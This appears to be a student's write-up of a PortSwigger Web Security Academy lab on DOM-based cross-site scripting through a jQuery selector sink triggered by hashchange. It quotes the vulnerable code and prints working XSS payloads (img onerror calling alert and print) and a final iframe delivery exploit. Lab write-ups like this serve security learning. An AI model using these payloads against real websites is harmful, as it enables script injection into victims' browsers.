@@ -1,0 +1,40 @@
+LAB INFO:  DOM XSS in jQuery selector sink using a hashchange event
+
+MORE INFO:  This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
+
+To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 
+
+ANALYSIS:
+1. We do open the lab homepage and didnot see anything search field or anything
+2. And then I directly go into the view page sourece to read the js code
+3. There I found it's using a jquery with on hashchange event means: # (after hash it will change)
+4. The code is looks like: 
+     4.1 $(window).on('hashchange', function(){
+                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+                            if (post) post.get(0).scrollIntoView();
+                        });
+    4.2 So, what it's doing is: the window will be change on the hashchange event.
+    4.3 And, it is finding the element <section> which have class name(i.e blog-list) i.e we can view: 'section.blog-view'.
+    4.4 Then it tries to find the <h2> element if it finds then it will automatically scroll to that <h2> element.
+
+5. If I use this url: https://0acd00e1037f37ff808a9e4600f100c7.web-security-academy.net/#The history of swigging port
+   5.1 Then as per the url it's directly goes into the post containing <h2> element i.e The history of swigging port
+
+6. Now we can use our payload like: https://0acd00e1037f37ff808a9e4600f100c7.web-security-academy.net/# <img src=1 onerror=alert(1)>
+   6.1 This is giving me an alert(1) messages but we have to invoke the print() to the victim hai
+
+7. So, let's try: https://0acd00e1037f37ff808a9e4600f100c7.web-security-academy.net/# <img src=1 onerror=print()>
+    7.1 This is giving me an page to print a messages
+
+8. Now how to send it to the user??
+  8.1 We will try to send the user the malicious code from the <iframe> tag hai.
+  8.2 Now we can see does our <iframe> is injected or not by: 
+     8.2.1 <iframe src="website_link"></iframe> 
+     8.2.2 And then we will go to the website link and see if our <iframe> is injected or not and we can see that the iframe is injected.
+  8.3 Now we can do after injecting the iframe page to inject our malicious payload by using:
+     8.3.1 <iframe src="https://0ab1008204d59a4480430d7200be00c0.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"</iframe> ==> This is saying like after loading the page successfully from the <iframe> tag then it will inject the malicious payload.
+
+
+9. Successfully we solve the lab
+
+  <iframe src="https://0ab1008204d59a4480430d7200be00c0.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
